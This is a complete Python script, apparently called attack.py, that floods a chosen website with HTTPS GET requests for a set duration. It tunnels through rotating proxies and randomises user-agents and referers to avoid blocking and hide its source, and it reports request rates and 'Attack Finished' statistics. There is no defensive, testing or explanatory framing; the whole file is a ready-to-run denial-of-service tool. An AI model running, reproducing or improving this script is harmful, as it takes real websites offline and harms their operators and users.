import socket, ssl, random, threading, time, sys, os

# Load files
def load_file(filename, fallback=[]):
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return fallback

proxies = load_file('proxy.txt') or load_file('proxies.txt')
user_agents = load_file('ua.txt') or [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)',
    'Mozilla/5.0 (Linux; Android 11; Mobile)'
]
referers = load_file('refs.txt') or ['https://google.com']

if len(sys.argv) < 3:
    print('Usage: python attack.py [target] [duration]')
    sys.exit(1)

target = sys.argv[1]
duration = int(sys.argv[2])

parsed = target.replace('https://', '').replace('http://', '').split('/', 1)
target_host = parsed[0]
target_path = '/' + parsed[1] if len(parsed) > 1 else '/'
target_port = 443

# Stats
total_requests = 0
success_requests = 0
failed_requests = 0
current_rps = 0
peak_rps = 0

lock = threading.Lock()

def random_choice(lst):
    return random.choice(lst)

def send_request():
    global total_requests, success_requests, failed_requests, current_rps

    while True:
        try:
            proxy = random_choice(proxies)
            proxy_ip, proxy_port = proxy.split(':')
            user_agent = random_choice(user_agents)
            referer = random_choice(referers)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((proxy_ip, int(proxy_port)))
            connect_str = f"CONNECT {target_host}:443 HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
            sock.sendall(connect_str.encode())

            response = sock.recv(4096)
            if b'200' not in response:
                sock.close()
                with lock:
                    failed_requests += 1
                continue

            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)

            req = f"GET {target_path} HTTP/1.1\r\n" \
                  f"Host: {target_host}\r\n" \
                  f"User-Agent: {user_agent}\r\n" \
                  f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" \
                  f"Accept-Language: en-US,en;q=0.9\r\n" \
                  f"Referer: {referer}\r\n" \
                  f"Connection: Keep-Alive\r\n\r\n"

            ssl_sock.sendall(req.encode())
            ssl_sock.close()

            with lock:
                total_requests += 1
                success_requests += 1
                current_rps += 1

        except Exception:
            with lock:
                total_requests += 1
                failed_requests += 1

def monitor():
    global current_rps, peak_rps
    while True:
        time.sleep(1)
        with lock:
            if current_rps > peak_rps:
                peak_rps = current_rps
            print(f"Total Requests: {total_requests} | RPS: {current_rps}")
            current_rps = 0

print(f"\nFlooding Target: {target}")
print(f"Using {len(proxies)} Proxies.\n")

threads = []

# Start monitor thread
monitor_thread = threading.Thread(target=monitor)
monitor_thread.daemon = True
monitor_thread.start()

# Start attack threads
for _ in range(os.cpu_count() * 2):
    t = threading.Thread(target=send_request)
    t.daemon = True
    threads.append(t)
    t.start()

# Run for duration
time.sleep(duration)

print('\nAttack Finished.')
print(f"Peak RPS: {peak_rps}")
print(f"SUCCESS: {success_requests}")
print(f"FAILED: {failed_requests}")

sys.exit(0)
            
